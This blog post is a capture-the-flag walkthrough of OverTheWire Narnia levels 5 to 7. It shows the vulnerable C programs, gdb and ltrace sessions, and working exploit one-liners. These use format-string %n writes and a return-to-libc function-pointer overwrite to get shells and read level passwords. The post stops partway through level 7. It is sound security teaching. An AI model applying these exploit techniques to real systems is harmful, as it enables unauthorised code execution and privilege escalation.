	<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="generator" content="Hugo 0.15" />

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title> Solving Narnia Part 2 &middot; Unlogic </title>

  
  <link rel="stylesheet" href="https://svenito.github.io/nowhere/css/poole.css">
  <link rel="stylesheet" href="https://svenito.github.io/nowhere/css/syntax.css">
  <link rel="stylesheet" href="https://svenito.github.io/nowhere/css/hyde.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://svenito.github.io/nowhere/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="https://svenito.github.io/nowhere/favicon.png">

  
  <link href="" rel="alternate" type="application/rss+xml" title="Unlogic" />
</head>

	<body class="">
		<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <a href="https://svenito.github.io/nowhere/"><h1>Unlogic</h1></a>
      <p class="lead">
       I have a keyboard, a compiler, and a whole load of luck 
      </p>
    </div>

    <ul class="sidebar-nav">
      <li><a href="https://svenito.github.io/nowhere/">Home</a> </li>
      
    </ul>

    <p>Sven Steinbauer</p>
  </div>
</div>


		<div class="content container">
			<div class="post">
			 	<h1>Solving Narnia Part 2</h1>
			  <span class="post-date">Mon, Apr 13, 2015</span>
			      

<p>Carrying on from <a href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">Part 1</a></p>

<h2 id="level-05:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 05</h2>

<table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
 
<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">64</span><span style="color: #f8f8f2">];</span>

	<span style="color: #f8f8f2">snprintf(buffer,</span> <span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #f8f8f2">buffer[</span><span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">(buffer)</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span style="color: #f8f8f2">);</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">==</span><span style="color: #ae81ff">500</span><span style="color: #f8f8f2">){</span>
		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;GOOD</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
		<span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">}</span>

	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;No way...let me give you a hint!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;buffer : [%s] (%d)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">strlen(buffer));</span>
	<span style="color: #f8f8f2">printf</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;i = %d (%p)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">i,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">i);</span>
	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>

<p>A fixed sized buffer again. This time however trying to overflow it in order to
write to <code>i</code> won&rsquo;t work. If we look at line 9 and lookup the manpage for <code>snprintf</code>
we see that</p>

<pre><code>The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte ('\0')) to str.
</code></pre>

<p>So we won&rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&rsquo;ve only really go one more to try: <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">format string attack</a> or
<em>uncontrolled format string vulnerability</em>. This happens when user input
isn&rsquo;t checked, and allows the user to use format characters (<code>%s</code>, <code>%x</code>) to read or
manipulate the stack.</p>

<p>For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&rsquo;ll grok it at some point.</p>

<p>Let&rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of <code>%x</code>, which read values from the stack and print them.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa&#39;+&#39;%x&#39;*10&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
</pre></div>


<p>Sure enough we see the beginning of the input string after the 4th <code>%x</code>. So we then
put the address if <code>i</code> into that location like and shorten the number of <code>%x</code>.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*5&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
</pre></div>


<p>Now we have the address of <code>i</code>, we use <code>%n</code> to write to that address, remembering
to remove one <code>%x</code> to keep the right length.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*4 + &#39;%n&#39;&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
</pre></div>


<p>So we see that we&rsquo;ve written the length of the string into <code>i</code>. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%500d&#39; + &#39;%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
</pre></div>


<p>We&rsquo;re <em>28</em> over the target, so let&rsquo;s reduce the padding</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%472d&#39; + &#39;%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
Change i&#39;s value from 1 -&gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
</pre></div>
</p>

<h2 id="level-06:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 06</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>

<span style="color: #66d9ef">extern</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">environ;</span>

<span style="color: #75715e">// tired of fixing values...</span>
<span style="color: #75715e">// - morla</span>
<span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">long</span> <span style="color: #a6e22e">get_sp</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
       <span style="color: #f8f8f2">__asm__(</span><span style="color: #e6db74">&quot;movl %esp,%eax</span><span style="color: #ae81ff">\n\t</span><span style="color: #e6db74">&quot;</span>
               <span style="color: #e6db74">&quot;and $0xff000000, %eax&quot;</span>
               <span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv[]){</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">b1[</span><span style="color: #ae81ff">8</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">b2[</span><span style="color: #ae81ff">8</span><span style="color: #f8f8f2">];</span>
	<span style="color: #66d9ef">int</span>  <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fp)(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">)(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">))</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">puts,</span> <span style="color: #f8f8f2">i;</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span><span style="color: #f92672">!=</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">){</span> <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s b1 b2</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span> <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span> <span style="color: #f8f8f2">}</span>

	<span style="color: #75715e">/* clear environ */</span>
	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">environ[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">memset(environ[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(environ[i]));</span>
	<span style="color: #75715e">/* clear argz    */</span>
	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">argv[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">memset(argv[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(argv[i]));</span>

	<span style="color: #f8f8f2">strcpy(b1,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #f8f8f2">strcpy(b2,argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #75715e">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(((</span><span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">long</span><span style="color: #f8f8f2">)fp</span> <span style="color: #f92672">&amp;</span> <span style="color: #ae81ff">0xff000000</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">get_sp())</span>
		<span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">fp(b1);</span>

	<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>In this rather complicated looking listing we notice a few things:</p>

<ul>
<li>line 17 is a function pointer to <code>puts</code></li>
<li>line 33 calls the function <code>fp</code> points to</li>
<li>line 31 prevents <code>fp</code> from pointing to anything in our frame</li>
</ul>

<p>The last lines means we need to point <code>fp</code> to a call in a system library.
This is going to be a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret to libc attack</a>. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute <code>system('/bin/sh')</code>. As luck would have it, <code>puts</code> and
<code>system</code> both have the same function definition: <code>int system(const char *command);</code> and
<code>int puts(const char *s);</code></p>

<p>Let&rsquo;s fire up gdb and figure out our addresses.
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &lt;+0&gt;:	push   %ebp
   0x0804855a &lt;+1&gt;:	mov    %esp,%ebp
   0x0804855c &lt;+3&gt;:	push   %ebx
   0x0804855d &lt;+4&gt;:	and    $0xfffffff0,%esp
   0x08048560 &lt;+7&gt;:	sub    $0x30,%esp

    &lt;-- snip --&gt;

   0x0804869b &lt;+322&gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &lt;+329&gt;:	call   0x8048410 &lt;exit@plt&gt;
   0x080486a7 &lt;+334&gt;:	lea    0x20(%esp),%eax
   0x080486ab &lt;+338&gt;:	mov    %eax,(%esp)
   0x080486ae &lt;+341&gt;:	mov    0x28(%esp),%eax
   0x080486b2 &lt;+345&gt;:	call   *%eax                &lt;-- calling *fp*
   0x080486b4 &lt;+347&gt;:	movl   $0x1,(%esp)
   0x080486bb &lt;+354&gt;:	call   0x8048410 &lt;exit@plt&gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
$<span style="color: #f8f8f2">1</span> <span style="color: #f92672">=</span> <span style="color: #f92672">{</span>&lt;text variable, no debug info&gt;<span style="color: #f92672">}</span> 0xf7e62cd0 &lt;system&gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
</pre></div>
</p>

<p>What I did here was to disassemble the <code>main</code> function and find out where
<code>fp</code> is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to <code>fp</code>. What we see is
that <code>$esp</code> points to <code>0xffffd6a0</code>, which is where the last 4 values of
<code>b2</code> are stored. This is also the argument that will be passed to the <code>fp</code> call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to <code>/bin/sh</code>, and we want <code>fp</code> to point to <code>system</code>. This is
the reason for the <code>p system</code>, it tells us the location of <code>system</code>.
Also note that our <code>segfault</code> is showing us the last
4 digits of <code>b1</code>. Perfect, I can use that to overwrite <code>fp</code> with the address of
<code>system</code> and I should be good to go.</p>

<p>As this is a little more advanced, let&rsquo;s go over the steps:</p>

<ul>
<li>Get the address of the argument to whatever <code>fp</code> points to</li>
<li>Figure out how to overwrite that with our argument</li>
<li>Get the address of <code>system</code></li>
<li>Overwrite what <code>fp</code> points to with <code>system</code>&rsquo;s address</li>
<li>Assemble payload and hopefully get a shell</li>
</ul>

<p>So the last step:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia6@melinda:/narnia$ /games/narnia/narnia6 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;a&#39;*8 + &#39;\xd0\x2c\xe6\xf7&#39; +&#39; &#39;+ &#39;b&#39;*8 + &#39;/bin/sh&#39;&quot;`</span>
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
</pre></div>
</p>

<h2 id="level-07:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 07</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">goodfunction</span><span style="color: #f8f8f2">();</span>
<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">hackedfunction</span><span style="color: #f8f8f2">();</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">vuln</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">const</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">format){</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">ptrf)();</span>

    <span style="color: #f8f8f2">memset(buffer,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buffer));</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;goodfunction() = %p</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">goodfunction);</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;hackedfunction() = %p</span><span style="color: #ae81ff">\n\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">hackedfunction);</span>

    <span style="color: #f8f8f2">ptrf</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">goodfunction;</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;before : ptrf() = %p (%p)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ptrf,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">ptrf);</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;I guess you want to come to the hackedfunction...</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">ptrf</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">goodfunction;</span>

    <span style="color: #f8f8f2">snprintf(buffer,</span> <span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">format);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">ptrf();</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&lt;=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">){</span>
            <span style="color: #f8f8f2">fprintf(stderr,</span> <span style="color: #e6db74">&quot;Usage: %s &lt;buffer&gt;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
            <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span>
    <span style="color: #f8f8f2">exit(vuln(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]));</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">goodfunction</span><span style="color: #f8f8f2">(){</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">fflush(stdout);</span>
        
    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">hackedfunction</span><span style="color: #f8f8f2">(){</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Way to go!!!!&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">fflush(stdout);</span>
    <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>The presence of <code>snprintf</code> indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&rsquo;s attack this</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &lt;+0&gt;:	push   %ebp
   0x080485ce &lt;+1&gt;:	mov    %esp,%ebp
   0x080485d0 &lt;+3&gt;:	sub    $0xa8,%esp
   0x080485d6 &lt;+9&gt;:	movl   $0x80,0x8(%esp)
   0x080485de &lt;+17&gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &lt;+25&gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &lt;+31&gt;:	mov    %eax,(%esp)
   0x080485ef &lt;+34&gt;:	call   0x80484b0 &lt;memset@plt&gt;
   0x080485f4 &lt;+39&gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &lt;+47&gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &lt;+54&gt;:	call   0x8048420 &lt;printf@plt&gt;
   0x08048608 &lt;+59&gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &lt;+67&gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &lt;+74&gt;:	call   0x8048420 &lt;printf@plt&gt;
   0x0804861c &lt;+79&gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &lt;+89&gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &lt;+95&gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &lt;+101&gt;:	mov    %edx,0x8(%esp)
   0x08048636 &lt;+105&gt;:	mov    %eax,0x4(%esp)
   0x0804863a &lt;+109&gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &lt;+116&gt;:	call   0x8048420 &lt;printf@plt&gt;
   0x08048646 &lt;+121&gt;:	movl   $0x8048818,(%esp)
   0x0804864d &lt;+128&gt;:	call   0x8048450 &lt;puts@plt&gt;
   0x08048652 &lt;+133&gt;:	movl   $0x2,(%esp)
   0x08048659 &lt;+140&gt;:	call   0x8048440 &lt;sleep@plt&gt;
   0x0804865e &lt;+145&gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &lt;+155&gt;:	mov    0x8(%ebp),%eax
   0x0804866b &lt;+158&gt;:	mov    %eax,0x8(%esp)
   0x0804866f &lt;+162&gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &lt;+170&gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &lt;+176&gt;:	mov    %eax,(%esp)
   0x08048680 &lt;+179&gt;:	call   0x80484c0 &lt;snprintf@plt&gt;
   0x08048685 &lt;+184&gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &lt;+190&gt;:	call   *%eax
   0x0804868d &lt;+192&gt;:	leave  
   0x0804868e &lt;+193&gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
</pre></div>
</p>

<p>So disassmble the <code>vuln</code> function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of <code>%x</code> you need. Using
<code>ltrace</code> it&rsquo;s possible to increment the number of <code>%x</code>&rsquo;s until you
see your string in the output again. I&rsquo;ll paste only the correcy output here</p>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia7@melinda:/narnia$ ltrace ./narnia7 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;`</span>
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;
memset(0xffffd630, &#39;\0&#39;, 128)                                = 0xffffd630
printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&quot;aaaabbbb8048238ffffd688f7ffda940&quot;..., 128, &quot;aaaabbbb%x%x%x%x%x%x%x&quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &lt;no return ...&gt;
+++ exited (status 0) +++
</pre></div>
